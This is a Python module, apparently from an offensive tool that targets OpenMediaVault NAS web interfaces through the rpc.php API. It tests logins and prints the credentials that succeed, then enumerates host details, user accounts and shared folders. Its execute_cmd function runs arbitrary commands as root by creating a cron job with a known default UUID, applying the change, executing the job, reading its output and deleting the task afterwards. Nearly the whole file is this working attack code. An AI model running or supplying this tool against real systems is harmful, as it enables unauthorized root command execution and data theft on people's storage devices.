import requests
import time
from utils.terminal import print_colored
from core.enums import COLORS

def __send_request(url, payload, headers, timeout=None):

    url = url.rstrip("/") + "/rpc.php"

    try:
        response = requests.post(url, json=payload, headers=headers, timeout=timeout)
        if response.status_code != 200:
            error_message = ""
            try:
                resp = response.json()
                error_message = resp['error']['message']
                print_colored(f"[!] Request failed: {error_message}", COLORS.RED)
            except Exception as e:
                print_colored(f"[!] Request failed: {e}", COLORS.RED)

            return error_message
        return response
    except requests.exceptions.Timeout:
        print_colored("[!] Request timed out", COLORS.RED)
    except requests.exceptions.RequestException:
        print_colored("[!] Failed to send request", COLORS.RED)

def authenticate(base_url, username, password):
    payload = {
        "service": "Session",
        "method": "login",
        "params": {
            "username": username,
            "password": password
        },
        "options": None
    }

    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json"
    }


    response = __send_request(base_url, payload, headers, timeout=5)

    if not response or type(response) == str:
        print_colored(f"[!] Authentication failed: {base_url}", COLORS.RED)
        return
        
    try:
        resp = response.json()
        if resp["response"]["authenticated"]:
            cookies = response.headers.get('Set-Cookie', "")

            if cookies:
                print_colored(f"[!] Authentication successfull: {base_url} - {username=} {password=}", COLORS.GREEN)
                return cookies
    except:
        pass


    
def get_system_info(base_url, cookies):

    payload = {
        "service":"System",
        "method":"getInformation",
        "params":None,
        "options":{
            "updatelastaccess":False
        }
    }

    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Cookie": cookies
    }

    response = __send_request(base_url, payload, headers)

    if type(response) == str:
        return False

    system_info = {}

    if not response:
        print_colored("[!] Unable to get System Info", COLORS.RED)
        return

    try:
        resp = response.json()
        resp = resp["response"]

        if 'hostname' in resp:
            system_info["hostname"] = resp["hostname"]
            system_info["uptime"] = round(resp["uptime"] / 86400)
            system_info["version"] = resp["version"]
            system_info["cpu_model"] = resp["cpuModelName"]
            system_info["kernel"] = resp["kernel"]
            system_info["total_ram"] = int(resp["memTotal"]) / 1e+9 
        else:
            #for older versions
            system_info["hostname"] = resp[0]["value"]
            system_info["uptime"] = resp[5]["value"]
            system_info["version"] = resp[1]["value"]
            system_info["cpu_model"] = resp[2]["value"]
            system_info["kernel"] = resp[3]["value"]
            system_info["total_ram"] = resp[8]["value"]["text"]

        return system_info

    except:
        print_colored(f"[!] Failed to parse response: {response.json()}")

    
def get_system_users(base_url, cookies):
    url = base_url.rstrip("/") + "/rpc.php"

    payload = {
        "service":"UserMgmt",
        "method":"enumerateAllUsers",
        "params":None,
        "options":None
    }

    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Cookie": cookies
    }

    response = __send_request(url, payload, headers)

    if type(response) == str:
        return False

    users_info = []

    if not response:
        print("[!] Unable to get Users Info")
        return users_info

    try:
        resp = response.json()
        resp = resp["response"]

        for user in resp:

            if 'nologin' in user["shell"] or 'sync' in user["shell"]: 
                continue

            users_info.append({
                "name": user["name"],
                "description": user["comment"].replace(',,,', ''),
                "uid": user["uid"],
                "groups": ", ".join(user["groups"]),
            })

        return users_info

    except:
        print(response.json())
        print(f"[!] Failed to parse response: {url}")


def get_shared_folders(base_url, cookies):
    url = base_url.rstrip("/") + "/rpc.php"

    payload = {
        "service":"ShareMgmt",
        "method":"getList",
        "params":{
            "start":0,
            "limit":25,
            "sortdir":"asc",
            "sortfield":"name"
        },
        "options":None
    }

    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Cookie": cookies
    }

    response = __send_request(url, payload, headers)

    if type(response) == str:
        return False

    shared_folders = []

    if not response:
        print("[!] Unable to get Shared folders")
        return shared_folders

    try:
        resp = response.json()
        resp = resp["response"]["data"]

        for shared in resp:

            shared_folders.append({
                "name": shared["name"],
                "device": shared["device"],
                "dir": shared["mntent"]["dir"]
            })

        return shared_folders

    except:
        print(response.json())
        print(f"[!] Failed to parse response: {url}")


def execute_cmd(target, cookies, command, get_output=False):
    task_uuid = _create_scheduled_task(target, cookies, command)
    task_output = ""
    if not task_uuid:
        print_colored("[!] Failed to create task!", COLORS.RED)
        return
    
    print_colored(f"[-] Task created: task_uuid = {task_uuid}", COLORS.GREEN)
    time.sleep(2)
    apply_successful = _apply_changes(target, cookies)

    if apply_successful:
        time.sleep(2)
        print_colored(f"[-] Starting task", COLORS.GREEN)
        response = _run_scheduled_task(target, cookies, task_uuid)

        if response:
            task_output = response
        
        time.sleep(2)
        print_colored(f"[-] Deleting task", COLORS.GREEN)
        succes_delete = _delete_task(target, cookies, task_uuid)
        if not succes_delete:
            print_colored(f"[!] Failed to delete task in target: {target}", COLORS.RED)

        time.sleep(2)
        _apply_changes(target, cookies)

    if get_output:
        return task_output


def _create_scheduled_task(base_url, cookies, command):
    # default dumb uuid
    # https://github.com/openmediavault/openmediavault/blob/f85f294b441f1ca5763f5c252e6a3a7b3241d630/deb/openmediavault/workbench/src/app/functions.helper.ts#L466
    new_job_uuid = "fa4b1c66-ef79-11e5-87a0-0002b3a176b4"
    payload = {
        "service": "Cron",
        "method": "set",
        "params": {
            "uuid": new_job_uuid,
            "enable": False,
            "execution": "exactly",
            "minute": ["*"],
            "everynminute": False,
            "hour": ["*"],
            "everynhour": False,
            "dayofmonth": ["*"],
            "everyndayofmonth": False,
            "month": ["*"],
            "dayofweek": ["*"],
            "username": "root",
            "command": command,
            "sendemail": False,
            "comment": "",
            "type": "userdefined"
        },
        "options":None
    }

    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Cookie": cookies
    }

    response = __send_request(base_url, payload, headers)

    if not response:
        return False

    if type(response) == str:
        return False

    try:
        resp = response.json()
        task_uuid = resp["response"]["uuid"]

        return task_uuid
    except:
        print_colored(f"[!] Failed to parse response: {base_url}", COLORS.RED)
        print_colored(response.json(), COLORS.WHITE)
        

    
def _run_scheduled_task(base_url, cookies, task_uuid):

    payload = {
        "service": "Cron",
        "method": "execute",
        "params": {
            "uuid": task_uuid
        },
        "options":None
    }

    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Cookie": cookies
    }

    response = __send_request(base_url, payload, headers)

    if not response:
        return False
    
    if type(response) == str:
        return False

    try:   
        if response.status_code != 200:
            return False
        
        resp = response.json()
        output_path = resp["response"]

        retries = 0 

        while True:
            output = _get_output(base_url, cookies, output_path)

            if output != "":
                break
            
            time.sleep(2)
            retries += 1

            if retries == 5:
                break

        return output

    except:
        
        print_colored(f"[!] Failed to parse response: {base_url}", COLORS.RED)
        print_colored(response.json(), COLORS.WHITE)


def _apply_changes(base_url, cookies):
    payload = {
        "service": "Config",
        "method": "applyChangesBg",
        "params": {
            "modules":[],
            "force":False
            },
        "options":None
        }

    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Cookie": cookies
    }

    response = __send_request(base_url, payload, headers)
    
    if not response:
        return False

    if type(response) == str:
        return False

    try:

        if response.status_code != 200:
            return False
        
        resp = response.json()
        output_path = resp["response"]
        output = _get_output(base_url, cookies, output_path)

        if output != "":
            return False
        
        return True

    except:
        print_colored(f"[!] Failed to parse response: {base_url}", COLORS.RED)
        print_colored(response.json(), COLORS.WHITE)
        


def _get_output(base_url, cookies, path):
    payload = {
        "service":"Exec",
        "method":"getOutput",
        "params":
            {
                "filename": path.replace('\\', ''),
                "length": 1048576,
                "pos":0
            },
        "options":None
    }

    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Cookie": cookies
    }

    response = __send_request(base_url, payload, headers)

    if not response:
        return False
    
    if type(response) == str:
        return False

    try:
        resp = response.json()
        output = resp["response"]["output"]
        return output
    except:
        print_colored(f"[!] Failed to parse response: {base_url}", COLORS.RED)
        print_colored(response.json(), COLORS.WHITE)

def _delete_task(base_url, cookies, task_uuid):
    payload = {
        "service":"Cron",
        "method":"delete",
        "params":{
            "uuid":task_uuid
        },
        "options":None
    }

    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Cookie": cookies
    }

    response = __send_request(base_url, payload, headers)

    if not response:
        return False
    
    if type(response) == str:
        return False

    try:
        
        resp = response.json()
        output = resp["error"]

        if not output:
            return True

        return False
    except:
        print_colored(f"[!] Failed to parse response: {base_url}", COLORS.RED)
        print_colored(response.json(), COLORS.WHITE)